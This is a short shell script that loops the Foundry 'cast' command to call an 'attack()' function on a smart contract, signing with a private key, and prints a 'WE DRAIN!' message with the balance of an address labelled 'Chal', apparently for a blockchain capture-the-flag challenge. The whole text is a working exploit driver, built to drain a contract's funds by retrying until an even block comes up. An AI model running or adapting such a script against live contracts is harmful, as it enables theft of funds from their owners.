while true; do
  cast send 0xdfe86618FB21aC8FeE5434f81ccb1193FBaDA9c2 "attack()" \
    --rpc-url $RPC_URL \
    --private-key $PRIVATE_KEY \
    --gas-limit 15000000 \
    && echo "[SUCCESS] WE DRAIN! Balance Chal: $(cast balance 0xa1a4bc4e0c9ef55c94a2491dd26fa965c3ceb107 --rpc-url $RPC_URL --ether)" \
    || echo "[INFO] Wait even block..."
  sleep 1
done
